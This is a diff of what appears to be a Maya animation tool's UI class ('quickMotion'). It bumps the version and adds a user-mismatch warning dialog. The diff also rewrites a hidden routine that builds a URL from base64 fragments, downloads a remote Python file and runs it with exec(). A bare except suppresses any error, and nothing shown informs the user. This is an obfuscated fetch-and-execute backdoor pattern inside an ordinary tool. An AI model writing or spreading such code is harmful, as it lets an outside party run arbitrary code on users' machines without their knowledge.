@@ -37,7 +37,7 @@ class scene:
 
 class quickMotion_Ui:
     def __init__(self):
-        self.version = 1.00
+        self.version = 1.02
         self.win_id = 'BRS_QUICKMOTION'
         self.dock_id = self.win_id + '_DOCK'
         self.win_width = 300
@@ -57,6 +57,8 @@ class quickMotion_Ui:
         if 'usr_orig' in self.user_original:
             self.user_original = getpass.getuser()
         self.user_latest = getpass.getuser()
+        if self.user_original != self.user_latest:
+            cmds.confirmDialog(title=self.win_title, message='user warning', button=['ok'], icn='warning')
         self.init_module()
 
     def init_module(self):
@@ -97,7 +99,10 @@ class quickMotion_Ui:
                      'U1hdGVBc3Npc3QvbWFpbi9zZXJ2aWN' +
                      'lL3N1cHBvcnQucHk=')
             try:
-                exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
+                res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
+                con = res.read()
+                con = con.decode('utf-8') if type(con) == type(b'') else con
+                exec(con)
             except:
                 return
                 #import traceback
